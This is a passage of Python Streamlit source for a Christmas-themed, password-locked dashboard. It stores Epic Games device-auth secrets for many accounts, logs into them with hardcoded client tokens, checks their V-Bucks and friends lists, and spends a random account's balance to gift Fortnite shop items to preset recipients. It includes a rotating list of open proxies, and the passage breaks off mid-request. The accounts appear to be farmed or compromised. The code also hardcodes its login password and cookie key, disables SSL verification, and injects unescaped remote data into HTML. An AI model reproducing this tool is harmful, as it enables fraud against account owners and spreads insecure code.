import streamlit as st
from datetime import datetime, timedelta
import base64

st.set_page_config(
    page_title="\U00002753\U00002753\U00002753",
    page_icon=f"https://cdn.discordapp.com/attachments/1124456886125727846/1307151849530589234/Shahadah-1.png?ex=67394386&is=6737f206&hm=1510ea0e8204d69eaa22f0f8aa1cc8904f6a45ff4bb149bf1faec2810ecccf3b&",
    layout="wide",
    initial_sidebar_state="expanded",
)

def get_thanksgiving_countdown():
    now = datetime.now()
    year = now.year
    # Calculate Thanksgiving (fourth Thursday of November)
    thanksgiving = datetime(year, 11, (22 + (3 - datetime(year, 11, 1).weekday() + 7) % 7))
    
    if now > thanksgiving:
        # If it's past Thanksgiving this year, calculate for next year
        year += 1
        thanksgiving = datetime(year, 11, (22 + (3 - datetime(year, 11, 1).weekday() + 7) % 7))
    
    countdown = thanksgiving - now
    days = countdown.days
    hours, remainder = divmod(countdown.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return days, hours, minutes, seconds

def get_christmas_countdown():
    now = datetime.now()
    christmas = datetime(now.year, 12, 25)
    
    if now > christmas:
        # If it's past Christmas this year, calculate for next year
        christmas = datetime(now.year + 1, 12, 25)
    
    countdown = christmas - now
    days = countdown.days
    hours, remainder = divmod(countdown.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return days, hours, minutes, seconds

# Add these subtle UI enhancements to your CSS
st.markdown("""
<style>
    /* Subtle card hover effect */
    [data-testid="stContainer"]:hover {
        transform: translateY(-2px);
        transition: transform 0.2s ease;
    }
    
    /* Gradient border for important elements */
    .stTextInput input:focus {
        border-color: #c41e3a !important;
        box-shadow: 0 0 5px rgba(196,30,58,0.2) !important;
    }
    
    /* Clean dividers */
    hr {
        border: none;
        height: 1px;
        background: linear-gradient(to right, transparent, #c41e3a, transparent);
        margin: 20px 0;
    }
    
    /* Subtle link styling */
    a {
        color: #c41e3a !important;
        text-decoration: none !important;
        border-bottom: 1px dotted #c41e3a;
    }
    
    a:hover {
        border-bottom: 1px solid #c41e3a;
    }
    
    /* Metric value emphasis */
    [data-testid="stMetricValue"] {
        font-weight: bold;
        color: #c41e3a !important;
    }
    
    /* Subtle loading animation */
    .stProgress > div > div > div {
        transition: width 0.3s ease;
    }
    
    /* Clean table styling */
    .dataframe {
        border: none !important;
    }
    
    .dataframe td {
        text-align: center !important;
    }
    
    /* Subtle tooltip style */
    [data-tooltip]:hover:before {
        background-color: rgba(196,30,58,0.9);
        border-radius: 5px;
    }
</style>
""", unsafe_allow_html=True)

st.markdown("""
<style>
    /* Progress bar colors */
    .stProgress > div > div > div {
        background: linear-gradient(to right, #c41e3a, #165b33) !important;
    }
    
    /* Tab styling */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        border-bottom: 2px solid rgba(196,30,58,0.2);
    }
    
    .stTabs [data-baseweb="tab"] {
        border-radius: 4px 4px 0px 0px;
        padding: 10px 20px;
        background-color: transparent;
    }
    
    .stTabs [aria-selected="true"] {
        background-color: rgba(196,30,58,0.1);
    }
    
    /* Success message styling */
    .stSuccess {
        border-left-color: #165b33 !important;
    }
    
    /* Warning message styling */
    .stWarning {
        border-left-color: #c41e3a !important;
    }
    
    /* Selectbox styling */
    .stSelectbox select {
        border-color: rgba(196,30,58,0.3) !important;
    }
    
    /* Number input arrows */
    .stNumberInput [aria-label="increment"] svg,
    .stNumberInput [aria-label="decrement"] svg {
        color: #c41e3a !important;
    }
</style>
""", unsafe_allow_html=True)

st.markdown("""
<style>
    /* Subtle Christmas accents */
    h1 {
        color: #c41e3a !important;
        text-shadow: 0 0 10px rgba(255,255,255,0.2);
    }
    
    /* Button styling */
    .stButton button {
        background-color: #c41e3a !important;
        color: white !important;
        border: 2px solid #ffffff !important;
        transition: all 0.3s ease;
    }
    
    .stButton button:hover {
        transform: translateY(-2px);
        box-shadow: 0 0 15px rgba(196,30,58,0.5);
    }
    
    /* Sidebar accent */
    [data-testid="stSidebar"] {
        border-right: 2px solid #c41e3a;
    }
    
    /* Festive header */
    .main .block-container:before {
        content: "ðŸŽ„ â­ ðŸŽ…";
        display: block;
        text-align: center;
        font-size: 24px;
        padding: 10px;
        margin-bottom: 20px;
    }
    
    /* Container accents */
    [data-testid="stContainer"] {
        border-radius: 10px;
        border: 1px solid rgba(196,30,58,0.3);
    }
</style>
""", unsafe_allow_html=True)

st.markdown("""
<style>
    /* Background Gradient */
    body {
        background: linear-gradient(to bottom, #1e3c72, #2a5298, #1e3c72);
        color: #fff;
    }
    
    /* Snowflake animation */
    @keyframes snowflakes-fall {0% {top: -10%;} 100% {top: 100%;}}
    @keyframes snowflakes-shake {0%, 100% {transform: translateX(0);} 50% {transform: translateX(80px);}}
    
    .snowflake {
        color: #fff;
        font-size: 1.2em;
        font-family: Arial;
        text-shadow: 0 0 8px #d3e3ff, 0 0 12px #b3c7ff;
        position: fixed;
        top: -10%;
        z-index: 9999;
        user-select: none;
        cursor: default;
        animation-name: snowflakes-fall, snowflakes-shake;
        animation-duration: 12s, 4s;
        animation-timing-function: linear, ease-in-out;
        animation-iteration-count: infinite, infinite;
        animation-play-state: running, running;
    }
    
    /* Individual snowflake delays for a more scattered look */
    .snowflake:nth-of-type(0) {left: 1%; animation-delay: 0s, 0s;}
    .snowflake:nth-of-type(1) {left: 10%; animation-delay: 1.5s, 1s;}
    .snowflake:nth-of-type(2) {left: 20%; animation-delay: 6s, 1s;}
    .snowflake:nth-of-type(3) {left: 30%; animation-delay: 4.5s, 2s;}
    .snowflake:nth-of-type(4) {left: 40%; animation-delay: 2.5s, 2s;}
    .snowflake:nth-of-type(5) {left: 50%; animation-delay: 8s, 2.5s;}
    .snowflake:nth-of-type(6) {left: 60%; animation-delay: 5.5s, 1.5s;}
    .snowflake:nth-of-type(7) {left: 70%; animation-delay: 3s, 1s;}
    .snowflake:nth-of-type(8) {left: 80%; animation-delay: 1s, 0.5s;}
    .snowflake:nth-of-type(9) {left: 90%; animation-delay: 3.5s, 1.2s;}
    .snowflake:nth-of-type(10) {left: 25%; animation-delay: 2s, 0.8s;}
    .snowflake:nth-of-type(11) {left: 65%; animation-delay: 4.8s, 2.2s;}
    .snowflake:nth-of-type(12) {left: 35%; animation-delay: 1.3s, 3s;}
    .snowflake:nth-of-type(13) {left: 15%; animation-delay: 5s, 2.1s;}
    .snowflake:nth-of-type(14) {left: 85%; animation-delay: 3.2s, 0.7s;}

    /* Optional footer with greeting */
    .footer {
        position: fixed;
        bottom: 10px;
        width: 100%;
        text-align: center;
        font-size: 1.2em;
        color: #fff;
        font-family: 'Courier New', Courier, monospace;
        text-shadow: 0 0 4px #d3e3ff;
    }
</style>

<!-- Snowflakes and footer -->
<div class="snowflakes" aria-hidden="true">
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
  <div class="snowflake">â†</div>
  <div class="snowflake">â…</div>
</div>
""", unsafe_allow_html=True)




import json
import os
import requests
import random
from dateutil import parser
import asyncio
import httpx
import pyperclip
from timeit import default_timer as timer
from PIL import Image
from io import BytesIO
import aiohttp
import datetime
from concurrent.futures import ThreadPoolExecutor
import threading
from queue import Queue
from asyncio import as_completed
import nest_asyncio
nest_asyncio.apply()
import threading
from concurrent.futures import ThreadPoolExecutor
from math import ceil
import hashlib
from datetime import datetime, timedelta
import logging
from streamlit_cookies_manager import EncryptedCookieManager
from itsdangerous import URLSafeTimedSerializer
import os
from bcrypt import hashpw, gensalt, checkpw



# Initialize session state
if 'loaded_db' not in st.session_state:
    st.session_state.loaded_db = None
if 'passed' not in st.session_state:
    st.session_state.passed = 0
if 'failed' not in st.session_state:
    st.session_state.failed = 0
if 'total' not in st.session_state:
    st.session_state.total = 0
if 'accs_sorted' not in st.session_state:
    st.session_state.accs_sorted = []
if 'lock' not in st.session_state:
    st.session_state.lock = asyncio.Lock()
if 'item_shop_hash' not in st.session_state:
    st.session_state.item_shop_hash = ""
if 'refresh_lock' not in st.session_state:
    st.session_state.refresh_lock = threading.Lock()
if 'refresh_results' not in st.session_state:
    st.session_state.refresh_results = Queue()
if 'friends_list' not in st.session_state:
    st.session_state.friends_list = []
if 'friends_search' not in st.session_state:
    st.session_state.friends_search = ""
if 'current_page' not in st.session_state:
    st.session_state.current_page = 1
if 'items_per_page' not in st.session_state:
    st.session_state.items_per_page = 10
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False
if 'remember_me' not in st.session_state:
    st.session_state.remember_me = False
if 'last_auth_time' not in st.session_state:
    st.session_state.last_auth_time = None
if 'current_category' not in st.session_state:
    st.session_state.current_category = "all"

query_params = st.query_params
if 'category' in query_params:
    st.session_state['current_category'] = query_params['category'][0]

import bcrypt
import time

PASSWORD = "KobeKeepsHumpingHisDuck88"
hashed_password = bcrypt.hashpw(PASSWORD.encode('utf-8'), bcrypt.gensalt())

# Secure cookie configuration
SECRET_KEY = os.environ.get("SECRET_KEY", "default_secure_random_string")
serializer = URLSafeTimedSerializer(SECRET_KEY)

# Hashing the password (only once, during setup)
def hash_password(password: str):
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
def set_secure_cookie(data):
    return serializer.dumps(data)

def get_secure_cookie(cookie):
    try:
        return serializer.loads(cookie, max_age=30*24*3600)  # Valid for 30 days
    except Exception as e:
        print(f"Error loading cookie: {e}")
        return None

# Rate limiting: Track failed attempts and lock after max failures
MAX_FAILED_ATTEMPTS = 3
LOCK_TIME = 600  # Lock for 10 minutes

def check_login_attempts():
    current_time = time.time()
    if "failed_attempts" not in st.session_state:
        st.session_state.failed_attempts = 0
        st.session_state.first_failed_attempt_time = None

    if st.session_state.failed_attempts >= MAX_FAILED_ATTEMPTS:
        lock_time_left = LOCK_TIME - (current_time - st.session_state.first_failed_attempt_time)
        if lock_time_left > 0:
            st.error(f"Too many failed attempts. Try again in {int(lock_time_left // 60)} minutes.")
            return False
        else:
            st.session_state.failed_attempts = 0  # Reset after lock time
            st.session_state.first_failed_attempt_time = None

    return True

def get_manager():
    """
    Returns an instance of EncryptedCookieManager
    """
    cookies = EncryptedCookieManager(
        prefix="account_gift_manager/",
        password=os.environ.get("COOKIES_PASSWORD", "KobeKeepsHumpingHisDuck88")
    )
    
    if not cookies.ready():
        st.stop()
    
    return cookies

def check_password():
    """
    Returns True if the user is authenticated, False otherwise.
    """
    if not check_login_attempts():
        return False
    
    cookies = get_manager()
    
    # Check if auth cookie exists and is valid
    if 'auth_token' in cookies:
        try:
            auth_data = json.loads(cookies['auth_token'])
            last_auth_time = datetime.strptime(auth_data['last_auth_time'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() - last_auth_time < timedelta(days=30):
                st.session_state.authenticated = True
                return True
        except Exception as e:
            print(f"Cookie error: {e}")
            pass
    
    # If not authenticated, hide everything except login
    if not st.session_state.authenticated:
        # Custom HTML and styling for the login page
        st.markdown("""
        <style>
            [data-testid="stSidebar"] {display: none}
            #MainMenu {visibility: hidden}
            footer {visibility: hidden}
            .stDeployButton {display:none}
            .stPassword > label {font-size: 20px; font-weight: bold;}
            .stCheckbox > label {font-size: 16px;}
            div[data-testid="stToolbar"] {display: none}

            /* Christmas lights animation */
            .christmas-lights {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                z-index: 1000;
                display: flex;
                justify-content: space-between;
                padding: 10px;
            }
            .light {
                width: 12px;
                height: 12px;
                border-radius: 50%;
                margin: 0 15px;
                animation: lights 2s ease-in-out infinite alternate;
            }
            .light:nth-child(4n+1) { background: #ff0000; animation-delay: 0s; }
            .light:nth-child(4n+2) { background: #00ff00; animation-delay: 0.4s; }
            .light:nth-child(4n+3) { background: #ffff00; animation-delay: 0.8s; }
            .light:nth-child(4n+4) { background: #0000ff; animation-delay: 1.2s; }

            @keyframes lights {
                0%, 100% { transform: scale(0.5); opacity: 0.5; }
                50% { transform: scale(1.0); opacity: 1; }
            }

            /* Christmas card style for containers */
            [data-testid="stContainer"] {
                background: rgba(255,255,255,0.1);
                border-radius: 15px;
                padding: 20px;
                box-shadow: 0 4px 8px rgba(0,0,0,0.2);
                backdrop-filter: blur(5px);
            }

            /* Candy cane striped headers */
            h1, h2, h3 {
                background: repeating-linear-gradient(
                    45deg,
                    #ff0000 0px,
                    #ff0000 10px,
                    #ffffff 10px,
                    #ffffff 20px
                );
                -webkit-background-clip: text;
                color: transparent;
                text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            }

            /* Glowing effect for buttons */
            .stButton button {
                box-shadow: 0 0 10px #ffba08;
                animation: glow 1.5s ease-in-out infinite alternate;
            }

            @keyframes glow {
                from { box-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #ffba08; }
                to { box-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #ffba08; }
            }
        </style>

        <!-- Christmas lights -->
        <div class="christmas-lights">
            <div class="light"></div><div class="light"></div><div class="light"></div>
            <div class="light"></div><div class="light"></div><div class="light"></div>
            <div class="light"></div><div class="light"></div><div class="light"></div>
            <div class="light"></div><div class="light"></div><div class="light"></div>
            <div class="light"></div><div class="light"></div><div class="light"></div>
            <div class="light"></div><div class="light"></div><div class="light"></div>
            <div class="light"></div><div class="light"></div>
        </div>
        """, unsafe_allow_html=True)
        
        col1, col2, col3 = st.columns([1,2,1])
        with col2:
            st.title("\U00002753\U00002753\U00002753\U00002753\U00002753\U00002753\U00002753\U00002753\U00002753\U00002753")
            
            password = st.text_input("Enter Password", type="password")
            remember_me = st.checkbox("Remember me for 30 days", key="remember_checkbox")
            
            if st.button("Login"):
                if bcrypt.checkpw(password.encode('utf-8'), hashed_password):
                    st.session_state.authenticated = True
                    
                    # Set auth cookie if remember me is checked
                    if remember_me:
                        auth_data = {
                            'last_auth_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        cookies['auth_token'] = json.dumps(auth_data)
                        cookies.save()  # Force save the cookies
                    
                    st.success("Login successful!")
                    st.rerun()
                else:
                    st.session_state.failed_attempts += 1
                    if st.session_state.first_failed_attempt_time is None:
                        st.session_state.first_failed_attempt_time = time.time()
                    st.error("Incorrect password")
                    return False
        return False
    return True

def setup_logging():
    """
    Configure logging for the application
    """
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
        
    logging.basicConfig(
        filename=f'logs/app_{datetime.now().strftime("%Y%m%d")}.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Also log to streamlit
    streamlit_handler = logging.StreamHandler(st)
    streamlit_handler.setLevel(logging.WARNING)
    logging.getLogger().addHandler(streamlit_handler)

# Proxy list from original file
PROXIES = [
    "4.175.121.88:80",
    "72.169.67.61:87",
    "147.139.168.187:3128",
    "47.88.3.19:8080",
    "97.76.251.138:8080",
    "47.243.175.55:6969",
    "130.162.128.90:3128",
    "47.243.175.55:8001",
    "35.236.207.242:33333",
    "198.49.68.80:80",
    "66.29.154.105:3128",
    "144.49.99.216:8080",
    "144.49.99.190:8080",
    "38.50.166.244:999",
    "38.45.251.236:999",
    "23.224.132.90:80",
    "138.68.60.8:3128",
    "108.174.194.15:5566",
    "38.45.246.210:999",
    "50.231.0.43:4481",
    "47.243.237.233:80",
    "206.0.16.0:999",
    "34.106.64.101:80",
    "99.20.24.9:8888",
    "193.123.73.47:3128",
    "216.66.89.10:8080",
    "167.235.181.45:2000",
    "172.93.213.177:80",
    "71.86.129.131:8080",
    "138.68.60.8:8080",
    "154.85.58.149:80",
    "161.97.132.227:3128",
    "198.199.86.11:3128",
    "38.156.233.75:999",
    "20.219.137.240:3000",
    "47.243.177.210:8088",
    "159.65.77.168:8585",
    "20.120.240.49:80",
    "185.208.206.182:3128",
    "130.162.161.128:80",
    "159.223.63.181:8118",
    "216.238.99.171:80",
    "170.187.226.142:3128",
    "206.233.177.254:80",
    "23.94.41.236:8081",
    "65.21.232.59:8786",
    "38.52.162.255:999",
    "204.157.240.53:999",
    "129.213.118.148:3128",
    "162.212.157.35:8080",
    "157.245.27.9:3128",
    "162.212.157.238:8080",
    "162.212.153.95:8080",
    "63.42.112.155:8001",
    "34.86.252.79:8585",
    "34.162.24.17:8585",
    "34.86.196.77:8585",
    "34.86.64.245:8585",
    "34.162.183.32:8585",
    "34.162.76.11:8585",
    "35.193.158.6:8585",
    "34.162.59.88:8585",
    "34.162.67.130:8585",
    "34.162.171.228:8585",
    "34.85.211.38:8585",
    "34.86.138.63:8585",
    "34.162.135.2:8585",
    "34.174.141.41:8585",
    "34.162.156.215:8585",
    "34.85.155.119:8585",
    "34.162.53.144:8585",
    "34.162.22.200:8585",
    "35.245.31.182:8585",
    "66.29.154.103:3128",
    "198.44.191.202:45787",
    "38.52.220.198:999",
    "158.101.113.18:80",
    "65.20.171.253:8080",
    "75.89.101.62:80",
    "165.225.206.248:10007",
    "38.51.243.145:999",
    "174.138.184.82:38661"
]


async def get_friends_for_account(account, client_token):
    """Get friends for a single account"""
    try:
        url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'basic {client_token}'
        }
        data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
        
        async with httpx.AsyncClient() as client:
            auth_req = await client.post(url=url, headers=headers, data=data)
            
            if auth_req.status_code != 200:
                return None
                
            access_token = auth_req.json()["access_token"]
            
            # Get friends list
            friends_url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account['account_id']}/summary"
            headers = {
                'Authorization': f'Bearer {access_token}'
            }
            
            friends_req = await client.get(url=friends_url, headers=headers)
            if friends_req.status_code == 200:
                return {
                    "account_id": account["account_id"],
                    "friends": friends_req.json()
                }
            return None
    except Exception as e:
        return None

def friends_list_worker(account, results_queue):
    """Worker function for threading"""
    client_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
    result = asyncio.run(get_friends_for_account(account, client_token))
    if result:
        results_queue.put(result)

def get_all_friends(accounts):
    """Get friends for all accounts using threading"""
    results = Queue()
    threads = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        for account in accounts:
            thread = executor.submit(friends_list_worker, account, results)
            threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.result()
    
    # Collect results
    friends_data = []
    while not results.empty():
        friends_data.append(results.get())
    
    return friends_data

async def refresh_account_vbucks(account, client_token):
    """Refresh V-bucks for a single account"""
    try:
        url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'basic {client_token}'
        }
        data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
        
        async with httpx.AsyncClient() as client:
            auth_req = await client.post(url=url, headers=headers, data=data)
            
            if auth_req.status_code != 200:
                return None
                
            access_token = auth_req.json()["access_token"]
            
            # Get account details and vbucks
            profile_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account["account_id"]}/client/QueryProfile?profileId=common_core&rvn=-1'
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {access_token}'
            }
            
            profile = await client.post(url=profile_url, headers=headers, data="{}")
            profile_data = profile.json()
            
            # Calculate vbucks
            vbucks = 0
            try:
                items = profile_data['profileChanges'][0]['profile']['items']
                for item in items:
                    if items[item]['templateId'][:12] == "Currency:Mtx":
                        vbucks += items[item]['quantity']
            except:
                vbucks = 0
                
            return {
                "account_id": account["account_id"],
                "vbucks": vbucks
            }
    except Exception as e:
        return None

def refresh_worker(account, platform, results_queue):
    """Worker function for threading"""
    client_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU=" if platform == "Android" else "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
    result = asyncio.run(refresh_account_vbucks(account, client_token))
    if result:
        results_queue.put(result)

def refresh_all_vbucks(accounts, platform="Android"):
    """Refresh V-bucks for all accounts using threading"""
    results = Queue()
    threads = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        for account in accounts:
            thread = executor.submit(refresh_worker, account, platform, results)
            threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.result()
    
    # Collect results
    updated_accounts = []
    while not results.empty():
        updated_accounts.append(results.get())
    
    return updated_accounts



def update_account_vbucks(file_path, updated_accounts):
    """Update account V-bucks in the file"""
    with st.session_state.refresh_lock:
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                accounts = json.load(f)
            
            # Update vbucks for each account
            for updated in updated_accounts:
                for i, acc in enumerate(accounts):
                    if acc["account_id"] == updated["account_id"]:
                        accounts[i]["vbucks"] = updated["vbucks"]
                        break
            
            # Save updated accounts back to file
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(accounts, f, indent=4)
            
            return True
        except Exception as e:
            st.error(f"Error updating account V-bucks: {str(e)}")
            return False

def get_shop_items():
    url = "https://api.rookie-spitfire.xyz/v1/epic/shop"
    try:
        response = requests.get(url, verify=False)
        response.raise_for_status()
        
        data = response.json()
        offers = data['data']['offers']
        
        # Create a formatted string with numbered items
        formatted_items = []
        item_number = 1  # Separate counter for displayed items
        
        for offer in offers:
            try:
                # Get name from different possible locations
                name = offer.get('name') or offer.get('devName', 'Unknown Item')
                
                # Clean up the name to get just the item name
                # Remove [VIRTUAL] prefix
                name = name.replace("[VIRTUAL]", "").strip()
                
                # Remove "x" and quantity prefix if present (e.g., "1 x")
                if " x " in name:
                    name = name.split(" x ")[1]
                
                # Remove "for X MtxCurrency" suffix if present
                if " for " in name:
                    name = name.split(" for ")[0]
                
                # Get ID
                item_id = offer.get('id', 'Unknown ID')
                
                # Get price
                price = offer.get('price', {}).get('final', 0)
                
                # Format item info
                item_info = f"{item_number}. {name} - {price} V-Bucks"
                formatted_items.append(item_info)
                item_number += 1
                
            except Exception as e:
                print(f"Error processing offer: {str(e)}")
                continue
        
        # Join all items with newlines
        all_items = "\n".join(formatted_items)
        
        # Save to file
        with open("shop.txt", "w", encoding="utf-8") as f:
            f.write(all_items)
            
        return all_items, offers
        
    except requests.exceptions.RequestException as e:
        return f"Error fetching shop data: {str(e)}", []
    except Exception as e:
        return f"Unexpected error: {str(e)}", []

async def get_item_shop():
    """Fetch and display the current Fortnite Item Shop"""
    try:
        # Create data directory if it doesn't exist
        os.makedirs("data", exist_ok=True)
        
        # Get item shop data with SSL verification disabled
        item_shop = requests.get('https://api.rookie-spitfire.xyz/v1/epic/shop', verify=False)
        shop_hash = item_shop.json()['data']['hash']
        shop_image = item_shop.json()['data']['image']
        
        # Check if we need to download new image
        if shop_hash != st.session_state.item_shop_hash or not os.path.exists("data/shop.png"):
            st.session_state.item_shop_hash = shop_hash
            
            # Create SSL context that ignores verification
            ssl_context = aiohttp.TCPConnector(verify_ssl=False)
            
            async with aiohttp.ClientSession(connector=ssl_context) as cs:
                async with cs.get(shop_image) as response:
                    if response.status == 200:
                        # Save image
                        image_data = await response.read()
                        with open("data/shop.png", "wb") as f:
                            f.write(image_data)
                        st.success("Downloaded new Item Shop image!")
                    else:
                        st.error("Failed to download Item Shop image")
                        return
        
        # Display the image
        try:
            image = Image.open("data/shop.png")
            st.image(image, caption=f"Battle Royale Shop - {datetime.date.today()}", use_container_width=True)
        except FileNotFoundError:
            st.error("Item Shop image not found. Attempting to download...")
            # Try to download again if file doesn't exist
            ssl_context = aiohttp.TCPConnector(verify_ssl=False)
            async with aiohttp.ClientSession(connector=ssl_context) as cs:
                async with cs.get(shop_image) as response:
                    if response.status == 200:
                        image_data = await response.read()
                        with open("data/shop.png", "wb") as f:
                            f.write(image_data)
                        image = Image.open("data/shop.png")
                        st.image(image, caption=f"Battle Royale Shop - {datetime.date.today()}", use_column_width=True)
                    else:
                        st.error("Failed to download Item Shop image")
        except Exception as e:
            st.error(f"Error displaying image: {str(e)}")
            
    except Exception as e:
        st.error(f"Error fetching Item Shop: {str(e)}")

def item_shop_page():
    # Update the CSS to include gift button styling
    st.markdown("""
        <style>
        /* Container styling */
        .item-card {
            transition: transform 0.3s ease;
            padding: 10px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            margin-bottom: 10px;
            position: relative;  /* For gift button positioning */
        }
        
        /* Hover effect */
        .item-card:hover {
            transform: scale(1.05);
            z-index: 100;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        /* Image container */
        .item-image {
            width: 100%;
            transition: transform 0.3s ease;
            position: relative;  /* For gift button positioning */
        }
        
        /* Item details */
        .item-details {
            text-align: center;
            padding: 8px;
        }

        /* Price tag */
        .price-tag {
            font-weight: bold;
            color: #4CAF50;
            margin-bottom: 5px;
        }

        /* Gift button styling */
        .gift-button-container {
            display: flex;
            justify-content: center;
            align-items: center;
            position: absolute;
            bottom: 10px;
            right: 10px;
            left: 10px; /* Added to span container width */
        }

        .gift-button {
            background-color: #ff4b4b;
            color: white;
            border: none;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        .gift-button:hover {
            background-color: #ff6b6b;
            transform: scale(1.1);
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .item-card:hover {
                transform: scale(1.03);
            }
            .gift-button {
                width: 32px;
                height: 32px;
            }
        }
        </style>
    """, unsafe_allow_html=True)


    st.title("Item Shop")
    
    # Preset account IDs
    recipient_ids = {
        "Matteo": "b0fbe18932bb40469c5dc13e2d3f98ac",
        "Lucca": "223ae36b0946495a8ac5ec63370c2810",
        "Daniel" : "139ff8d7939344b499f7e7ed283fe6cc",
        "Ariel" : "2919499553af4cafb9adcb5da82d60ec",
        "Leah" : "94faf1ecf4da448b955f031cbdc47282"
    }
    
    # Get shop data
    url = "https://api.rookie-spitfire.xyz/v1/epic/shop"
    try:
        response = requests.get(url, verify=False)
        response.raise_for_status()
        data = response.json()['data']
        
        # Sort offers by price (descending order)
        sorted_offers = sorted(data['offers'], key=lambda x: x['price']['final'], reverse=True)
        
        # Create columns for recipients
        recipient = st.selectbox(
            "Select Gift Recipient",
            list(recipient_ids.keys()),
            key="recipient_select"
        )
        
        gift_to_id = recipient_ids[recipient]
        
        # Create a grid layout for items - increased to 4 columns for smaller items
        cols = st.columns(4)  # Changed from 3 to 4 columns
        current_col = 0
        
        filtered_offers = []
        for offer in sorted_offers:
            with cols[current_col]:

                st.markdown(f"""
                    <div class="item-card">
                        <div class="item-image">
                            <img src="{offer['assets'].get('featured') or offer['assets'].get('icon')}" alt="{offer['name']} Image"/>
                        </div>
                        <div class="item-details">
                            <h4>{offer['name']}</h4>
                            <p class="price-tag">{offer['price']['final']:,} V-Bucks</p>
                            {f'<p style="color: #FF6B6B;">Save {offer["price"]["regular"] - offer["price"]["final"]} V-Bucks</p>' 
                            if offer['price']['final'] < offer['price']['regular'] else ''}
                    </div>
                """, unsafe_allow_html=True)
                
                # Create a card-like container for each item
                with st.container():
                    
                    # Gift button
                    if offer.get('giftable', False):
                        if st.button("\U0001F381 Gift", key=f"gift_btn_{offer['id'] or f'item_{random.randint(1000, 9999)}'}"):  # Simplified button to just emoji
                            try:
                                # Check if added_{gift_to_id}.json exists
                                gift_file_path = f"./dbs/added_{gift_to_id}.json"
                                if not os.path.exists(gift_file_path):
                                    st.error(f"No accounts found for {recipient}. Please add accounts first.")
                                    continue
                                
                                # Load the accounts
                                with open(gift_file_path, "r", encoding="utf-8") as f:
                                    accounts = json.load(f)
                                
                                if not accounts:
                                    st.error("No accounts available for gifting")
                                    continue
                                
                                # Find an account with enough V-Bucks
                                valid_accounts = [acc for acc in accounts if acc["vbucks"] >= offer['price']['final']]
                                
                                if not valid_accounts:
                                    st.error(f"No accounts found with enough V-Bucks ({offer['price']['final']})")
                                    continue
                                
                                # Pick a random account with enough V-Bucks
                                selected_account = random.choice(valid_accounts)
                                
                                # Try Android first, then iOS
                                tokens = {
                                    "Android": "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU=",
                                    "iOS": "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
                                }
                                
                                success = False
                                for platform, client_token in tokens.items():
                                    try:
                                        st.info(f"Attempting gift with {platform}...")
                                        
                                        # First authenticate
                                        auth_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
                                        auth_headers = {
                                            'Content-Type': 'application/x-www-form-urlencoded',
                                            'Authorization': f'basic {client_token}'
                                        }
                                        auth_data = f"grant_type=device_auth&account_id={selected_account['account_id']}&device_id={selected_account['device_id']}&secret={selected_account['secret']}"
                                        
                                        auth_req = requests.post(url=auth_url, headers=auth_headers, data=auth_data)
                                        
                                        if auth_req.status_code == 200:
                                            access_token = auth_req.json()["access_token"]
                                            
                                            # Send gift request
